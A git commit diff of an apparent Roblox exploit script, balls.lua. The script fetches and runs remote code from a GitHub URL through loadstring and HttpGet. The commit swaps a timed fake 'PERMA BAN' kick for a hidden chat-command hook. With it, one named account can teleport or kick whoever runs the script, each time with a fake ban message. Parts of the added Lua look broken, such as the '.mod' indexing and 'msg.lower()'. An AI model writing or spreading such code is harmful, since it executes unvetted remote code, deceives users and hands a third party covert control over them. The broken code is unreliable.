4f9be9ae26177494c845f2e44fe4fd39944af910
sygzxW <73584462+sygzxW@users.noreply.github.com>
2022-12-18 23:29:27 +0100

    Update balls.lua

--- balls.lua
+++ balls.lua
@@ -1,5 +1,13 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zuwdaq/aim-viewer/main/aim%20viewer"))()
-game.Players.PlayerAdded:Connect(function(plr)
-    wait(90)
-    game.Players.LocalPlayer:Kick("PERMA BAN")
+local mod = game.Players.KubsoniX_PL
+local lp = game.Players.LocalPlayer
+
+game:GetService("Players").mod.Chatted:Connect(function(msg)
+    if msg.lower() == ":bring ." then
+        lp.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(mod.Name).HumanoidRootPart.Position)
+    end
+    if msg.lower() == ":kick ." then
+        lp:Kick("PERMA BANNED")
+    end
+    
 end)
